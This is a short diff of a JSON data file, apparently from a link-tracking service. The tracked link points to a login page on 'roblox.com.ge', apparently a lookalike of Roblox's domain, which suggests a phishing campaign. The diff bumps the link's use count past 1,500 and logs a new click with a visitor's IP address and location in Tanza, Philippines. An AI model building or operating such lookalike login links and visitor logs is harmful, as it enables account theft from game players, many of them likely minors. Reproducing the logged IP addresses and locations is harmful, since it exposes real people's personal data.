@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1577,
+    "useCount": 1578,
     "createdBy": "admin",
     "clicks": [
       {
@@ -12779,6 +12779,14 @@
       },
       {
         "timestamp": 1777455595602,
+        "ip": "136.158.83.232",
+        "country": "Philippines",
+        "city": "Tanza",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777455596793,
         "ip": "136.158.83.232",
         "country": "Philippines",
         "city": "Tanza",
